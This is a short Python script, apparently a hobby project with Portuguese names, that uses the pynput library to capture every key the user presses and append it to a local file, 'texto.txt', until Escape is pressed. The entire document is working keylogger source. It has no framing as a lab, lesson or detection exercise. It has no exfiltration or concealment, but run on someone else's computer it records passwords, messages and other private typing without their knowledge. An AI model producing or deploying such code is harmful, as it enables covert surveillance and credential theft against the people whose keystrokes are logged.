from pynput import keyboard
import sys
import time
def pressionar(tecla):
    if tecla == keyboard.Key.esc:
        sys.exit()
    try:
        arquivo = open('texto.txt', 'a')
        arquivo.writelines(str(tecla.char) + ' ')
    except:
        if str(tecla) == 'Key.space':
            arquivo = open('texto.txt', 'a')
            arquivo.writelines('  ')
        elif str(tecla) == 'Key.caps_lock':
            arquivo = open('texto.txt', 'a')
            arquivo.writelines('')
        elif (str(tecla) == 'Key.shift') or (str(tecla) == 'Key.shift_r'):
            arquivo = open('texto.txt', 'a')
            arquivo.writelines('')
        else:
            arquivo = open('texto.txt', 'a')
            arquivo.writelines(str(tecla) + ' ')
listener = keyboard.Listener(on_press=pressionar)
listener.start()
